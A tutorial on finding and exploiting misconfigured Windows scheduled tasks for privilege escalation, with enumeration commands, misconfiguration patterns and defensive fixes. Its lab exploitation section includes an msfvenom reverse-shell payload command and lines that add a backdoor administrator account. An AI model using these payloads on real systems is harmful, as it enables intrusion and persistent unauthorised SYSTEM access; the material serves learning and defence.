# 1️⃣ What Are Scheduled Tasks?

Windows **Task Scheduler** allows users and services to run programs at:

* Specific times
* System startup
* User logon
* Certain events

Tasks can run as:

* `SYSTEM`
* A specific user
* A service account

If misconfigured, they can allow a low-privileged user to execute code as **Administrator or SYSTEM**.

---

# 2️⃣ Why Scheduled Tasks Are Interesting for Privilege Escalation

Privilege escalation happens when:

* A task runs as **SYSTEM**
* The executable/script it runs is:

  * Writable by a low-privileged user
  * Located in a writable directory
  * Using weak file permissions
  * Using unquoted service paths

If you can modify what the task executes → you can execute your code as SYSTEM.

---

# 3️⃣ Enumeration (How to Find Scheduled Tasks)

## 🔹 Method 1: CMD

```cmd
schtasks /query /fo LIST /v
```

Shows:

* Task Name
* Run As User
* Task To Run
* Schedule
* Last Run Result

---

## 🔹 Method 2: PowerShell

```powershell
Get-ScheduledTask
```

Detailed:

```powershell
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}
```

Check the action:

```powershell
Get-ScheduledTask -TaskName "TaskName" | Select -ExpandProperty Actions
```

---

## 🔹 Method 3: Check Task Files Directly

Tasks are stored in:

```
C:\Windows\System32\Tasks\
```

You can inspect permissions:

```cmd
icacls "C:\Path\To\File.exe"
```

---

## 🔹 Automated Tools (In Lab Environments)

* WinPEAS
* PowerUp (PowerShell)
* Seatbelt
* SharpUp

Example with PowerUp:

```powershell
Invoke-AllChecks
```

---

# 4️⃣ Common Scheduled Task Misconfigurations

### 🚨 1. Writable Executable

Task runs:

```
C:\Program Files\Backup\backup.exe
```

If `Users` group has `Modify` permissions → you can replace it.

Check:

```cmd
icacls backup.exe
```

---

### 🚨 2. Writable Folder

If the folder is writable, attacker can:

* Delete original EXE
* Replace it with malicious one

---

### 🚨 3. Unquoted Path (Less common but possible)

Example:

```
C:\Program Files\My App\app.exe
```

Without quotes:

```
C:\Program Files\My App\app.exe
```

Windows might interpret:

* `C:\Program.exe`
* `C:\Program Files\My.exe`

If you can write to `C:\`, you could exploit it.

---

### 🚨 4. Task Runs Script From Writable Location

Example:

```
C:\Users\Public\script.ps1
```

If writable → modify script → wait for task to trigger.

---

# 5️⃣ Exploitation Concept (Ethical Lab Example)

⚠️ Only in authorized lab environments.

Scenario:

* Task runs as SYSTEM
* Runs `backup.exe`
* `backup.exe` is writable

Steps (conceptually):

1. Backup original file
2. Replace with malicious executable
3. Wait for task execution (or trigger manually if allowed)
4. Get SYSTEM shell

Example payload (lab):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f exe > backup.exe
```

Or a simple test payload:

```c
system("net user hacker Pass123! /add");
system("net localgroup administrators hacker /add");
```

---

# 6️⃣ Defensive Measures (Very Important)

As an ethical hacker, always think defense:

✅ Ensure:

* Scheduled task binaries are not writable by standard users
* Use least privilege accounts
* Quote paths properly
* Restrict folder permissions
* Monitor task changes
* Enable logging (Event Viewer → Task Scheduler logs)

Check permissions:

```cmd
icacls "C:\Program Files\App"
```

Remove excessive permissions:

```cmd
icacls file.exe /remove Users
```

---

# 7️⃣ Real-World Hunting Checklist

When doing privilege escalation enumeration:

* [ ] Does task run as SYSTEM?
* [ ] Can I modify the executable?
* [ ] Can I modify the folder?
* [ ] Is the script writable?
* [ ] Is the path unquoted?
* [ ] Can I manually trigger it?

---

# 🧠 Advanced Tip

Also check:

* **Task Triggers**
* **Hidden tasks**
* **XML definitions**
* Registry:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache
```

---

# 🔥 Want to Practice?

Try:

* Hack The Box (Windows machines)
* TryHackMe – Windows Privilege Escalation room
* Set up a local lab with:

  * Windows 10 VM
  * Non-admin user
  * Intentionally misconfigured task

